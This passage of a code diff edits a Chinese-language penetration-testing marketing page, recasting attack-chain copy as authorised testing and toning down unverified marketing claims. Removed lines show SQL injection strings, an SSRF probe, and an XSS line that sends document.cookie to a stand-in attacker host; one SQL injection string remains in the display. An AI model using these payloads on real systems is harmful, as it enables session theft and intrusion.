@@ -162,61 +162,61 @@ function BookingModal({ onClose }: { onClose: () => void }) {
   );
 }
 
-// ── Attack Chain Phases ────────────────────────────────────────────
-const ATTACK_PHASES = [
+// ── Asset / Service / Risk Relations ───────────────────────────────
+const RELATION_STAGES = [
   {
-    id: 'recon', step: '01', label: '侦察', color: '#6366f1', icon: Search,
-    desc: '全方位信息收集，绘制攻击面地图',
+    id: 'scope', step: '01', label: '授权目标', color: '#6366f1', icon: FileText,
+    desc: '记录测试对象、范围与授权边界',
     techniques: [
-      { name: 'OSINT 情报收集', detail: '通过公开数据源获取目标组织信息、员工、技术栈' },
-      { name: '端口与服务扫描', detail: 'TCP/UDP 全端口扫描，识别 Nginx、Tomcat、Redis 等服务指纹' },
-      { name: '子域名枚举', detail: 'DNS 爆破 + 证书透明度日志，发现隐藏业务系统' },
-      { name: '指纹识别', detail: '识别 CMS（WordPress/Shiro）、框架版本、WAF 类型' },
+      { name: '目标清单', detail: '确认域名、IP 与指定 API 等授权测试对象' },
+      { name: '端口范围', detail: '明确允许探测的 TCP/UDP 端口范围' },
+      { name: '时间窗口', detail: '记录测试开始、结束时间及业务避让时段' },
+      { name: '授权边界', detail: '标记禁止操作、紧急联系人与停止条件' },
     ],
-    findings: ['发现 312 个开放端口', '18 个子域名', '3 个高危指纹'],
+    findings: ['域名 / IP / 指定 API', '授权端口范围', '测试时间窗口'],
   },
   {
-    id: 'weapon', step: '02', label: '武器化', color: '#f59e0b', icon: Crosshair,
-    desc: '基于目标特征定制攻击载荷',
+    id: 'asset', step: '02', label: '资产发现', color: '#3b82f6', icon: Search,
+    desc: '汇总授权范围内发现的资产信息',
     techniques: [
-      { name: 'SQL 注入 Payload', detail: "' OR 1=1 --  /  UNION SELECT null,table_name FROM information_schema.tables" },
-      { name: 'XSS 载荷构造', detail: "<script>document.location='http://attacker/?c='+document.cookie</script>" },
-      { name: 'SSRF 探针', detail: 'http://127.0.0.1:6379/  探测内网 Redis 未授权' },
-      { name: 'RCE 利用链', detail: 'Log4Shell / Shiro 反序列化 / FastJSON 组合利用' },
+      { name: '子域名记录', detail: '关联已发现的子域名与所属授权目标' },
+      { name: 'IP 记录', detail: '记录解析地址及其与域名的关联关系' },
+      { name: '端口记录', detail: '展示授权范围内探测到的开放端口' },
+      { name: '资产状态', detail: '保留发现时间、响应状态与证据索引' },
     ],
-    findings: ['构造 47 个专属载荷', '覆盖 CVE-2024-x', '0 day 利用链'],
+    findings: ['子域名与 IP', '开放端口', '发现时间'],
   },
   {
-    id: 'delivery', step: '03', label: '交付', color: '#ef4444', icon: Zap,
-    desc: '多路径渗透，突破防御边界',
+    id: 'service', step: '03', label: '服务识别', color: '#f59e0b', icon: Database,
+    desc: '将端口与服务、组件信息关联展示',
     techniques: [
-      { name: 'Web 应用渗透', detail: 'HTTP/HTTPS 请求注入，绕过 WAF 规则过滤' },
-      { name: '业务逻辑漏洞', detail: '支付绕过、越权访问、验证码逻辑缺陷' },
-      { name: 'API 端点测试', detail: '未授权 API 接口、水平越权、参数篡改' },
-      { name: '社工钓鱼模拟', detail: '邮件钓鱼 + 水坑攻击模拟（需客户授权）' },
+      { name: '服务类型', detail: '展示 HTTP、数据库及中间件等服务识别结果' },
+      { name: '组件候选', detail: '记录 CMS、框架及服务器组件的识别候选' },
+      { name: '版本信息', detail: '展示探测到的版本信息并保留证据来源' },
+      { name: 'Web 指纹', detail: '关联站点使用的 Web 技术与防护组件候选' },
     ],
-    findings: ['突破 3 道防线', '获取内网立足点', 'WAF 绕过成功'],
+    findings: ['服务类型', '组件与版本候选', 'Web 技术指纹'],
   },
   {
-    id: 'exploit', step: '04', label: '利用', color: '#10b981', icon: Target,
-    desc: '权限提升，评估真实业务影响',
+    id: 'risk', step: '04', label: '风险记录', color: '#ef4444', icon: AlertTriangle,
+    desc: '关联已发现风险、证据与复核状态',
     techniques: [
-      { name: '权限提升', detail: '从普通用户提权至 root/Administrator 系统权限' },
-      { name: '横向移动', detail: '通过内网漫游，访问核心数据库与业务系统' },
-      { name: '数据泄露评估', detail: '模拟敏感数据（PII/金融记录）泄露路径评估' },
-      { name: '持久化植入模拟', detail: '验证后门/Webshell 植入可行性（不实际执行）' },
+      { name: '风险位置', detail: '将候选问题关联至对应资产、端口与服务' },
+      { name: '证据留存', detail: '保留请求响应、截图及复现步骤等证据索引' },
+      { name: '风险评级', detail: '记录候选风险等级与判断依据' },
+      { name: '复核状态', detail: '区分待复核、已验证与未确认等处理状态' },
     ],
-    findings: ['获取数据库 root', '访问 230 万条记录', '全链路漏洞报告'],
+    findings: ['风险位置', '证据索引', '人工复核状态'],
   },
 ];
 
 // ── Service Steps ──────────────────────────────────────────────────
 const SERVICE_STEPS = [
   { step: 1, title: '授权与调研',     icon: FileText,    color: '#6366f1', desc: '明确测试范围与边界，签署授权协议。双方确认资产清单、测试时间窗口与紧急联系机制，确保测试合法合规、风险可控。' },
-  { step: 2, title: '信息收集',       icon: Search,      color: '#3b82f6', desc: '全方位资产指纹识别：子域名枚举、端口扫描、服务识别、CMS 与框架版本探测，构建完整攻击面视图。' },
-  { step: 3, title: '威胁建模',       icon: Radar,       color: '#f59e0b', desc: '基于目标特征定制攻击路径。结合 MITRE ATT&CK 框架，针对目标技术栈制定专属载荷与渗透策略。' },
-  { step: 4, title: '漏洞挖掘与利用', icon: Target,      color: '#ef4444', desc: '机器初筛（自动化扫描）+ 专家深度渗透测试：SQL注入、XSS、RCE、越权访问、业务逻辑缺陷全面覆盖，专家人工复核消除误报。' },
-  { step: 5, title: '报告与复测',     icon: CheckCircle2,color: '#10b981', desc: '交付详细的漏洞报告（含复现步骤、风险评级、修复建议），提供 30 天免费复测服务，直至全部漏洞修复完成。' },
+  { step: 2, title: '信息收集',       icon: Search,      color: '#3b82f6', desc: '在授权范围内开展资产指纹识别：子域名枚举、端口探测、服务识别、CMS 与框架版本探测，形成攻击面视图。' },
+  { step: 3, title: '测试重点梳理',   icon: Radar,       color: '#f59e0b', desc: '基于授权目标、服务指纹和业务边界梳理测试重点，并针对目标技术栈制定测试方案。' },
+  { step: 4, title: '自动化检测与专家复核', icon: Target, color: '#ef4444', desc: '对网络、Web 及指定 API 的常见风险开展自动化检测，并由专家复核高危告警；已验证问题形成复现步骤和相关证据。覆盖类型、复核量与证据数量以经确认的统计口径为准。' },
+  { step: 5, title: '报告与复测',     icon: CheckCircle2,color: '#10b981', desc: '交付包含复现步骤、风险评级与修复建议的测试报告。报告交付后 30 日内，针对本次报告所列问题提供 1 次免费复测；新增目标、新增接口及重大版本变更不在免费范围内。' },
 ];
 
 // ── Credentials ───────────────────────────────────────────────────
@@ -232,30 +232,30 @@ const CREDENTIALS = [
 // ── Video Demo Modal ───────────────────────────────────────────────
 const VIDEO_SCRIPTS: Record<string, { title: string; phases: { time: string; label: string; desc: string }[] }> = {
   '01': {
-    title: '资产自动发现 · 3 分钟万级资产画像',
+    title: '资产自动发现 · 授权范围探测演示',
     phases: [
       { time: '00:00–00:05', label: '痛点呈现', desc: '传统扫描工具报告杂乱，资产指纹缺失，遗漏隐蔽服务' },
       { time: '00:05–00:25', label: '产品演示', desc: '输入目标域名 → 一键启动 → 自动枚举子域名、端口、服务指纹' },
-      { time: '00:25–00:40', label: '高光时刻', desc: '3 分钟生成拓扑图，精准识别隐蔽 Redis 端口与 Shiro 指纹' },
-      { time: '00:40–00:45', label: '结尾号召', desc: '"3 分钟，万级资产精准画像" · 立即申请试测' },
+      { time: '00:25–00:40', label: '结果呈现', desc: '形成资产拓扑，并展示已识别的 Redis 端口与 Shiro 指纹' },
+      { time: '00:40–00:45', label: '条件说明', desc: '探测耗时受授权端口范围、带宽、并发、硬件与目标响应影响' },
     ],
   },
   '02': {
-    title: '漏洞深度验证 · 0 误报承诺演示',
+    title: '漏洞深度验证 · 人工复核演示',
     phases: [
       { time: '00:00–00:05', label: '痛点呈现', desc: '普通扫描器产生大量误报，安全团队疲于奔命排查噪音' },
       { time: '00:05–00:25', label: '产品演示', desc: '专家人工验证流程：SQL 注入 PoC 执行 → 数据回显 → 确认可利用' },
-      { time: '00:25–00:40', label: '高光时刻', desc: '漏洞详情页展示：截图+PoC代码+修复建议一体，误报率 0%' },
+      { time: '00:25–00:40', label: '高光时刻', desc: '漏洞详情页展示：截图、PoC 代码、复现证据与修复建议一体呈现' },
       { time: '00:40–00:45', label: '结尾号召', desc: '"每个漏洞真实可利用，专家负责任交付" · 立即预约' },
     ],
   },
   '03': {
-    title: '业务逻辑测试 · 发现扫描器盲区',
+    title: '授权 API 业务逻辑测试演示',
     phases: [
-      { time: '00:00–00:05', label: '痛点呈现', desc: '支付系统上线后被薅羊毛，传统扫描器对业务逻辑漏洞束手无策' },
-      { time: '00:05–00:25', label: '产品演示', desc: '手动测试：修改支付金额参数 → 绕过验证 → 低价购买高价商品' },
-      { time: '00:25–00:40', label: '高光时刻', desc: '业务逻辑漏洞报告：5 个支付/越权/验证码场景，专家逐一复现' },
-      { time: '00:40–00:45', label: '结尾号召', desc: '"扫描器做不到的，我们来做" · 立即预约专家' },
+      { time: '00:00–00:05', label: '范围确认', desc: '确认授权接口清单、测试角色、业务流程与测试边界' },
+      { time: '00:05–00:25', label: '产品演示', desc: '以 crAPI 授权场景演示对象级越权、参数篡改等测试过程' },
+      { time: '00:25–00:40', label: '结果呈现', desc: '展示请求与响应记录、复现步骤及人工复核结论' },
+      { time: '00:40–00:45', label: '范围说明', desc: '定制化测试范围按接口清单、角色和业务流程确认' },
     ],
   },
 };
@@ -404,7 +404,7 @@ export function PenetrationTest() {
     ];
     return (
       <div style={{ background: 'linear-gradient(150deg,#fef2f2,#fff7ed)', borderRadius: 16, padding: '18px 20px', border: '1px solid rgba(239,68,68,0.18)' }}>
-        <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>金融系统渗透报告摘要</div>
+        <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>金融系统测试报告示例</div>
         <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
           {items.map(it => (
             <div key={it.label} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '8px 12px', background: '#fff', borderRadius: 9, border: `1px solid ${it.found ? it.color + '22' : '#e2e8f0'}` }}>
@@ -415,7 +415,7 @@ export function PenetrationTest() {
           ))}
         </div>
         <div style={{ marginTop: 12, padding: '8px 12px', background: 'rgba(239,68,68,0.07)', borderRadius: 9, border: '1px solid rgba(239,68,68,0.15)', fontSize: 11, color: '#b91c1c' }}>
-          发现 3 个高危漏洞 · 建议暂停上线 · 需在 48h 内修复
+          示例界面 · 风险等级、整改建议与修复周期以人工复核结论和项目约定为准
         </div>
       </div>
     );
@@ -423,27 +423,27 @@ export function PenetrationTest() {
 
   function GovMock() {
     const phases = [
-      { label: '资产探测', done: true, color: '#6366f1' },
-      { label: '边界突破', done: true, color: '#f59e0b' },
-      { label: '横向渗透', done: true, color: '#ef4444' },
-      { label: '目标达成', done: false, color: '#94a3b8' },
+      { label: '授权目标', done: true, color: '#6366f1' },
+      { label: '资产发现', done: true, color: '#3b82f6' },
+      { label: '服务识别', done: true, color: '#f59e0b' },
+      { label: '风险记录', done: false, color: '#94a3b8' },
     ];
     return (
       <div style={{ background: 'linear-gradient(150deg,#f5f3ff,#ede9fe)', borderRadius: 16, padding: '18px 20px', border: '1px solid rgba(99,102,241,0.18)' }}>
-        <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>护网演练 · 攻击链路</div>
+        <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>授权测试 · 信息关联示例</div>
         <div style={{ display: 'flex', gap: 4, alignItems: 'center', marginBottom: 16 }}>
           {phases.map((p, i) => (
             <React.Fragment key={p.label}>
               <div style={{ flex: 1, textAlign: 'center', padding: '8px 6px', background: p.done ? `${p.color}14` : '#f8fafc', borderRadius: 8, border: `1px solid ${p.done ? p.color + '30' : '#e2e8f0'}` }}>
                 <div style={{ fontSize: 10, fontWeight: 700, color: p.done ? p.color : '#94a3b8' }}>{p.label}</div>
-                <div style={{ fontSize: 9, color: p.done ? p.color : '#94a3b8', marginTop: 2 }}>{p.done ? '✓ 成功' : '未到达'}</div>
+                <div style={{ fontSize: 9, color: p.done ? p.color : '#94a3b8', marginTop: 2 }}>{p.done ? '✓ 已记录' : '待复核'}</div>
               </div>
               {i < phases.length - 1 && <ChevronRight size={12} style={{ color: '#d1d5db', flexShrink: 0 }} />}
             </React.Fragment>
           ))}
         </div>
         <div style={{ padding: '8px 12px', background: 'rgba(99,102,241,0.07)', borderRadius: 9, border: '1px solid rgba(99,102,241,0.15)', fontSize: 11, color: '#4f46e5' }}>
-          已模拟突破 3 层网络隔离 · 防御薄弱点已定位 · 生成加固报告
+          示例界面 · 关联结果以实际授权范围和人工复核结论为准
         </div>
       </div>
     );
@@ -451,13 +451,13 @@ export function PenetrationTest() {
 
   function EcomMock() {
     const bugs = [
-      { label: '支付金额可篡改', severity: '高危', color: '#ef4444' },
-      { label: '优惠券无限叠加', severity: '中危', color: '#d97706' },
-      { label: '验证码可重放', severity: '中危', color: '#d97706' },
+      { label: '对象级授权校验', severity: '候选', color: '#ef4444' },
+      { label: '请求参数边界测试', severity: '候选', color: '#d97706' },
+      { label: '接口访问控制', severity: '候选', color: '#d97706' },
     ];
     return (
       <div style={{ background: 'linear-gradient(150deg,#f0fdf4,#dcfce7)', borderRadius: 16, padding: '18px 20px', border: '1px solid rgba(16,185,129,0.18)' }}>
-        <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>电商业务逻辑漏洞</div>
+        <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>授权 API 测试候选项</div>
         <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
           {bugs.map(b => (
             <div key={b.label} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '9px 12px', background: '#fff', borderRadius: 9, border: `1px solid ${b.color}22` }}>
@@ -468,7 +468,7 @@ export function PenetrationTest() {
           ))}
         </div>
         <div style={{ marginTop: 12, padding: '8px 12px', background: 'rgba(16,185,129,0.07)', borderRadius: 9, border: '1px solid rgba(16,185,129,0.15)', fontSize: 11, color: '#065f46' }}>
-          修复后已复测通过 · 大促期间零安全事故 · 交付验收报告
+          示例界面 · 候选项需结合请求响应证据与人工复核确认
         </div>
       </div>
     );
@@ -477,29 +477,29 @@ export function PenetrationTest() {
   const INDUSTRY_SOLUTIONS = [
     {
       id: 'finance', icon: '🏦', accentColor: '#3b82f6', tag: '金融 / 证券 / 保险',
-      title: '满足银保监合规要求，保障交易系统安全',
-      subtitle: '核心交易系统授权渗透，0 误报专家报告',
-      desc: '面向银行、证券、保险等金融机构，严格遵循银保监会网络安全指引。覆盖核心交易系统、移动端 App、API 网关的全面渗透测试，发现越权访问、JWT 伪造、弱口令等高危漏洞，出具符合监管要求的报告，直接用于监管提交。',
-      metrics: [{ value: '0', label: '误报率' }, { value: '99%', label: '漏洞检出率' }, { value: '72h', label: '报告交付' }],
-      tags: ['银保监合规', 'API 安全', 'JWT 验证', '核心系统测试'],
+      title: '金融系统授权安全测试，辅助监管检查',
+      subtitle: '高危告警人工确认，报告周期边界清晰',
+      desc: '面向银行、证券、保险等机构，在授权范围内对核心交易系统、移动端 App 与 API 网关开展安全测试。标准范围项目从测试结束起 3 个工作日内交付报告；复杂项目根据资产数量和测试范围确认周期。报告可为监管检查提供依据，指定报送模板按项目约定。',
+      metrics: [{ value: '人工复核', label: '高危有效性确认' }, { value: '测试集', label: '检出率统计依据' }, { value: '3个工作日', label: '标准项目报告' }],
+      tags: ['监管检查支持', 'API 安全', 'JWT 验证', '核心系统测试'],
       mock: <FinanceMock />,
     },
     {
       id: 'gov', icon: '🏛️', accentColor: '#6366f1', tag: '政务 / 关键基础设施',
-      title: '护网行动专项支撑，关键基础设施全覆盖',
-      subtitle: '攻防对抗演练 + 等保 2.0 三级渗透',
-      desc: '支持政府机构、能源、交通等关键基础设施单位参与护网行动（HW）演练，提供红队攻击模拟、蓝队响应演练。覆盖等保 2.0 三级渗透测试，OT/SCADA 工控系统安全评估，协助单位在护网期间零失分。',
-      metrics: [{ value: '5年+', label: '护网经验' }, { value: '200+', label: '政务项目' }, { value: '0', label: '核心系统失陷' }],
-      tags: ['护网行动 HW', '等保 2.0 三级', 'OT/SCADA 评估', '红队演练'],
+      title: '政务与关键基础设施授权安全测试支撑',
+      subtitle: '按授权范围开展测试、证据留存与风险复核',
+      desc: '面向政府机构、能源、交通等单位，可按项目约定提供授权安全测试与演练支撑。具体资产范围、测试边界、项目周期和交付方式以双方确认的授权文件与合同为准；团队服务年限与项目数量仅在正式台账核实后披露。',
+      metrics: [{ value: '授权', label: '测试范围确认' }, { value: '证据', label: '过程记录留存' }, { value: '复核', label: '风险有效性确认' }],
+      tags: ['授权安全测试', '范围与边界', '证据留存', '人工复核'],
       mock: <GovMock />,
     },
     {
       id: 'ecom', icon: '🛍️', accentColor: '#10b981', tag: '电商 / 零售 / O2O',
-      title: '防止数据泄露，保障大促期间系统稳定',
-      subtitle: '业务逻辑漏洞专项测试，大促零事故',
-      desc: '针对电商平台大流量、高并发场景，专项测试支付逻辑漏洞（刷单、优惠码滥用）、用户数据隔离、第三方插件供应链风险。618/双11 大促前完成安全加固，确保系统在高负载下零安全事故。',
-      metrics: [{ value: '3亿+', label: '保障交易额' }, { value: '4h', label: '紧急响应' }, { value: '100%', label: '大促零事故' }],
-      tags: ['支付逻辑漏洞', '业务逻辑测试', '大促安全保障', '数据隔离验证'],
+      title: '电商与零售授权 API 安全测试',
+      subtitle: '按授权接口与业务流程开展专项测试',
+      desc: '针对电商平台的授权 API 与业务流程，按双方确认的接口清单、测试角色和业务边界开展逻辑测试；具体覆盖范围根据项目实际情况确定。',
+      metrics: [{ value: '接口', label: '清单确认' }, { value: '角色', label: '权限确认' }, { value: '流程', label: '边界确认' }],
+      tags: ['crAPI 场景', '授权 API 测试', '角色权限确认', '业务流程确认'],
       mock: <EcomMock />,
     },
   ];
@@ -529,26 +529,20 @@ export function PenetrationTest() {
                 </span>
               </h1>
               <p style={{ fontSize: 15, color: '#94a3b8', lineHeight: 1.8, margin: '0 0 32px', maxWidth: 420 }}>
-                模拟黑客真实攻击视角，人机协同验证系统防御边界。CCRC 一级资质，0 误报承诺，覆盖 Web / API / 业务逻辑全场景。
+                模拟攻击者视角，人机协同验证系统防御边界。支持网络、Web 及指定 API 安全测试；结合结构化证据和人工复核降低误报。
               </p>
-              <div style={{ display: 'flex', gap: 12 }}>
-                <button
-                  onClick={() => setShowBooking(true)}
-                  style={{ display: 'inline-flex', alignItems: 'center', gap: 8, padding: '13px 26px', background: 'linear-gradient(135deg,#ef4444,#f97316)', color: '#fff', border: 'none', borderRadius: 10, fontSize: 14, fontWeight: 700, cursor: 'pointer', boxShadow: '0 4px 20px rgba(239,68,68,0.45)' }}>
-                  <Calendar size={16} /> 预约专家演示
-                </button>
-              </div>
             </div>
 
             {/* Right: animated stats */}
             <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
               <motion.div animate={{ y: [0, -6, 0] }} transition={{ duration: 4, repeat: Infinity, ease: 'easeInOut' }}
                 style={{ background: 'rgba(15,23,42,0.7)', backdropFilter: 'blur(20px)', border: '1px solid rgba(239,68,68,0.2)', borderRadius: 16, padding: '18px 22px', boxShadow: '0 16px 40px rgba(239,68,68,0.15)' }}>
-                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 14 }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
                   <div style={{ width: 7, height: 7, borderRadius: '50%', background: '#ef4444', boxShadow: '0 0 8px #ef4444' }} />
-                  <span style={{ fontSize: 11, color: '#64748b', fontFamily: 'monospace' }}>渗透测试 · 实时扫描中</span>
-                  <span style={{ marginLeft: 'auto', padding: '2px 8px', background: 'rgba(239,68,68,0.18)', border: '1px solid rgba(239,68,68,0.35)', borderRadius: 8, fontSize: 10, color: '#fca5a5', fontWeight: 700 }}>ATTACKING</span>
+                  <span style={{ fontSize: 11, color: '#94a3b8', fontFamily: 'monospace' }}>授权测试结果快照</span>
+                  <span style={{ marginLeft: 'auto', padding: '2px 8px', background: 'rgba(59,130,246,0.15)', border: '1px solid rgba(96,165,250,0.3)', borderRadius: 8, fontSize: 10, color: '#93c5fd', fontWeight: 700 }}>演示项目数据</span>
                 </div>
+                <div style={{ marginBottom: 12, fontSize: 9.5, color: '#64748b', fontFamily: 'monospace' }}>测试目标数：1 个授权演示目标 · 统计时间：2026-08-01 14:30</div>
                 <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: 10, marginBottom: 14 }}>
                   {[{ val: '312', label: '开放端口', color: '#f87171' }, { val: '18', label: '子域名', color: '#fb923c' }, { val: '3', label: '高危指纹', color: '#fbbf24' }].map(s => (
                     <div key={s.label} style={{ textAlign: 'center', padding: '10px', background: `${s.color}10`, border: `1px solid ${s.color}25`, borderRadius: 10 }}>
@@ -566,7 +560,7 @@ export function PenetrationTest() {
                 style={{ background: 'rgba(30,41,59,0.75)', backdropFilter: 'blur(14px)', border: '1px solid rgba(255,255,255,0.07)', borderRadius: 14, padding: '14px 18px', marginLeft: 24, boxShadow: '0 12px 32px rgba(0,0,0,0.4)' }}>
                 <div style={{ display: 'flex', alignItems: 'center', gap: 7, marginBottom: 10 }}>
                   <AlertTriangle size={13} style={{ color: '#ef4444' }} />
-                  <span style={{ fontSize: 11, color: '#94a3b8', fontFamily: 'monospace' }}>高危漏洞已确认 · SQL 注入</span>
+                  <span style={{ fontSize: 11, color: '#94a3b8', fontFamily: 'monospace' }}>演示问题 · 已人工复核 · SQL 注入</span>
                 </div>
                 <div style={{ background: '#0f172a', borderRadius: 7, padding: '8px 12px', fontSize: 11, fontFamily: 'monospace', color: '#fca5a5', marginBottom: 9, lineHeight: 1.6 }}>
                   <span style={{ color: '#64748b' }}>payload: </span>admin' OR '1'='1'--
@@ -576,6 +570,7 @@ export function PenetrationTest() {
                     <span key={t.label} style={{ padding: '2px 8px', background: `${t.color}14`, border: `1px solid ${t.color}30`, borderRadius: 6, fontSize: 10, color: t.color, fontFamily: 'monospace', fontWeight: 700 }}>{t.label}</span>
                   ))}
                 </div>
+                <div style={{ marginTop: 9, fontSize: 9.5, color: '#64748b' }}>复现说明、请求/响应记录及相关证据已留存</div>
               </motion.div>
             </div>
           </div>
@@ -584,9 +579,9 @@ export function PenetrationTest() {
 
       <StickySubNav items={[
         { id: 'pt-capabilities', label: '核心能力' },
+        { id: 'pt-relations', label: '测试信息关联展示' },
         { id: 'pt-scenarios', label: '应用场景' },
         { id: 'pt-process', label: '测试流程' },
-        { id: 'pt-cta', label: '预约专家' },
       ]} />
 
       {/* ══ 2. CAPABILITIES — Zig-Zag layout (mirrors CodeVulnerabilityAudit) ══ */}
@@ -598,7 +593,7 @@ export function PenetrationTest() {
                 核心能力矩阵
               </div>
               <h2 style={{ fontSize: 'clamp(28px,3.5vw,44px)', fontWeight: 900, color: '#0f172a', margin: '0 0 12px' }}>不止于扫描，深度验证真实风险</h2>
-              <p style={{ fontSize: 15, color: '#64748b', margin: 0 }}>人机协同覆盖 Web / API / 业务逻辑全场景，0 误报承诺，每个漏洞均附带 PoC 与修复建议</p>
+              <p style={{ fontSize: 15, color: '#64748b', margin: 0 }}>支持网络、Web 及指定 API 安全测试；发现项结合结构化证据、PoC 复现说明和人工复核，持续降低误报</p>
             </div>
           </ScrollReveal>
 
@@ -607,9 +602,9 @@ export function PenetrationTest() {
               id: '01', side: 'left' as const, color: '#6366f1',
               panelBg: 'linear-gradient(145deg,#f0f4ff,#e8edfd)',
               title: '资产自动发现',
-              heading: '3 分钟完成万级资产指纹画像',
-              desc: '自动识别域名、IP、端口、服务，深度探测 CMS 类型、框架版本、WAF 品牌等指纹信息，构建完整攻击面地图，为后续漏洞挖掘奠定精准基础。',
-              tags: ['子域名枚举', '全端口扫描', '指纹库 50000+', 'WAF 识别'],
+              heading: '在授权范围内完成资产发现与指纹识别',
+              desc: '支持识别域名、IP、授权端口范围和服务，并探测 CMS 类型、框架版本、WAF 类型等指纹信息。实际探测耗时受带宽、并发、端口范围、硬件条件及目标响应影响。',
+              tags: ['子域名枚举', '授权端口探测', '服务指纹识别', 'WAF 识别'],
               panel: (
                 <div>
                   <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>资产扫描结果</div>
@@ -629,7 +624,10 @@ export function PenetrationTest() {
                     ))}
                   </div>
                   <div style={{ marginTop: 12, padding: '8px 12px', background: 'rgba(99,102,241,0.07)', borderRadius: 8, border: '1px solid rgba(99,102,241,0.15)', fontSize: 11, color: '#4f46e5' }}>
-                    已发现 312 个端口 · 18 个子域名 · 3 个高危指纹 · 耗时 2m 47s
+                    演示项目数据：312 个开放端口 · 18 个子域名 · 3 个高危指纹
+                  </div>
+                  <div style={{ marginTop: 7, fontSize: 10, color: '#64748b', lineHeight: 1.55 }}>
+                    指纹库有效记录数、版本与更新时间以经确认的版本清单为准。
                   </div>
                 </div>
               ),
@@ -638,9 +636,9 @@ export function PenetrationTest() {
               id: '02', side: 'right' as const, color: '#ef4444',
               panelBg: 'linear-gradient(145deg,#fff1f2,#fde8e8)',
               title: '漏洞深度验证',
-              heading: '专家人工复核，承诺 0 误报',
-              desc: '不止于扫描器输出，OSCP 持证专家对每个发现的漏洞进行人工复核与 PoC 利用验证。覆盖 SQL 注入、XSS、RCE、SSRF、越权访问等全部高危漏洞类型，真实可利用才算漏洞。',
-              tags: ['SQL 注入', 'XSS / RCE', 'SSRF', '越权访问', '0 误报'],
+              heading: '专家人工复核，降低误报',
+              desc: '在自动化发现基础上，对候选问题进行人工复核与 PoC 验证。支持 SQL 注入、XSS、RCE、SSRF、越权访问等常见高风险问题测试，并为已验证问题提供复现说明和相关证据。',
+              tags: ['SQL 注入', 'XSS / RCE', 'SSRF', '越权访问', '人工复核'],
               panel: (
                 <div>
                   <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>漏洞验证报告摘要</div>
@@ -666,7 +664,7 @@ export function PenetrationTest() {
                     ))}
                   </div>
                   <div style={{ marginTop: 10, padding: '7px 10px', background: 'rgba(239,68,68,0.06)', borderRadius: 7, border: '1px solid rgba(239,68,68,0.15)', fontSize: 10.5, color: '#b91c1c' }}>
-                    误报率 0% · 所有高危漏洞均有完整 PoC 复现视频
+                    演示项目中标记为“已验证”的发现附有人工复核结论、PoC 复现说明与相关证据
                   </div>
                 </div>
               ),
@@ -675,17 +673,17 @@ export function PenetrationTest() {
               id: '03', side: 'left' as const, color: '#f59e0b',
               panelBg: 'linear-gradient(145deg,#fffbf0,#fef3c7)',
               title: '业务逻辑测试',
-              heading: '专注支付、越权、验证码绕过等逻辑漏洞',
-              desc: '纯扫描器无法覆盖的业务特有安全场景：支付金额篡改、优惠券滥用、账号越权访问、验证码重放，需要安全专家结合业务理解手动测试，是挖出核心业务风险的关键。',
-              tags: ['支付逻辑绕过', '账号越权', '验证码重放', '接口未授权'],
+              heading: '支持 crAPI 等已验证授权 API 测试场景',
+              desc: '当前以 crAPI 等已验证授权 API 场景开展测试；定制化业务逻辑测试的覆盖范围，需根据接口清单、测试角色和业务流程与客户共同确认。',
+              tags: ['crAPI 场景', '接口清单确认', '角色权限确认', '业务流程确认'],
               panel: (
                 <div>
-                  <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>业务逻辑漏洞验证</div>
+                  <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>crAPI 授权场景验证示例</div>
                   <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
                     {[
-                      { scenario: '支付金额篡改', step: '修改 amount 参数 0.01 → 原价 ¥999 商品', impact: '直接经济损失', color: '#ef4444' },
-                      { scenario: '验证码可重放', step: '同一验证码发送 100+ 次均成功校验', impact: '账号暴破风险', color: '#d97706' },
-                      { scenario: 'API 水平越权', step: 'GET /api/order?uid=12345 可查他人订单', impact: '数据泄露', color: '#d97706' },
+                      { scenario: '对象级授权校验', step: '切换测试角色并访问非本人资源标识', impact: '越权风险候选', color: '#ef4444' },
+                      { scenario: '请求参数边界测试', step: '按授权清单修改可控字段并记录响应差异', impact: '参数校验候选', color: '#d97706' },
+                      { scenario: '接口访问控制', step: '对比不同角色访问指定 API 的响应结果', impact: '访问控制候选', color: '#d97706' },
                     ].map(s => (
                       <div key={s.scenario} style={{ background: '#fff', borderRadius: 10, padding: '12px 14px', border: `1.5px solid ${s.color}20` }}>
                         <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 5 }}>
@@ -732,9 +730,9 @@ export function PenetrationTest() {
                     </div>
                     <h3 style={{ fontSize: 24, fontWeight: 800, color: '#0f172a', margin: '0 0 16px', lineHeight: 1.35 }}>{item.heading}</h3>
                     <p style={{ fontSize: 14.5, color: '#64748b', lineHeight: 1.8, margin: '0 0 24px' }}>{item.desc}</p>
-                    <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8, marginBottom: 30 }}>
